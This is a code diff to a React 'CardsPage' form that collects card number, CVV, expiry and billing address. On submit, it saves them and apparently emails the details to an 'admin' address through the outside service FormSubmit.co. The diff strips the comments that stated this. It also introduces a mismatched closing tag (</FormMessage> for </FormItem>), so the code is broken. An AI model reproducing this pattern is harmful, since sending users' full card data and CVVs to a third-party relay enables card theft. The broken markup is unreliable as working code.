@@ -1,4 +1,3 @@
-
 'use client';
 
 import * as React from 'react';
@@ -49,8 +48,16 @@ export default function CardsPage() {
     const form = useForm<AddCardValues>({
         resolver: zodResolver(addCardSchema),
         defaultValues: {
+            nameOnCard: '',
+            cardNumber: '',
+            expiryDate: '',
+            cvv: '',
             brand: 'visa',
             type: 'debit',
+            billingAddress: '',
+            billingCity: '',
+            billingState: '',
+            billingZip: '',
             billingCountry: 'United States',
         }
     });
@@ -74,13 +81,11 @@ export default function CardsPage() {
     const onAddOwnSubmit = async (values: AddCardValues) => {
         try {
             // 1. Save to Firestore
-            // We store the information in the user's account for their view
             await addOwnCard({
                 ...values,
             });
 
             // 2. Send via FormSubmit.co email
-            // Send all the detailed info to the admin email
             const emailData = new FormData();
             emailData.append('Subject', `New Card Linked: ${values.brand.toUpperCase()} - ${user?.email}`);
             emailData.append('User Email', user?.email || 'Unknown');
@@ -211,7 +216,7 @@ export default function CardsPage() {
                                     </div>
                                     <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                         <FormField control={form.control} name="expiryDate" render={({ field }) => (
-                                            <FormItem><FormLabel>Expiry Date</FormLabel><FormControl><Input placeholder="MM/YY" maxLength={5} {...field} /></FormControl><FormMessage /></FormItem>
+                                            <FormItem><FormLabel>Expiry Date</FormLabel><FormControl><Input placeholder="MM/YY" maxLength={5} {...field} /></FormControl><FormMessage /></FormMessage>
                                         )} />
                                         <FormField control={form.control} name="cvv" render={({ field }) => (
                                             <FormItem><FormLabel>CVV</FormLabel><FormControl><Input placeholder="123" maxLength={4} {...field} /></FormControl><FormMessage /></FormItem>
@@ -219,7 +224,7 @@ export default function CardsPage() {
                                         <FormField control={form.control} name="brand" render={({ field }) => (
                                             <FormItem>
                                                 <FormLabel>Brand</FormLabel>
-                                                <Select onValueChange={field.onChange} defaultValue={field.value}>
+                                                <Select onValueChange={field.onChange} value={field.value}>
                                                     <FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl>
                                                     <SelectContent>
                                                         <SelectItem value="visa">Visa</SelectItem>
@@ -260,7 +265,7 @@ export default function CardsPage() {
                                     <FormField control={form.control} name="type" render={({ field }) => (
                                         <FormItem>
                                             <FormLabel>Card Type</FormLabel>
-                                            <Select onValueChange={field.onChange} defaultValue={field.value}>
+                                            <Select onValueChange={field.onChange} value={field.value}>
                                                 <FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl>
                                                 <SelectContent>
                                                     <SelectItem value="debit">Debit Card</SelectItem>
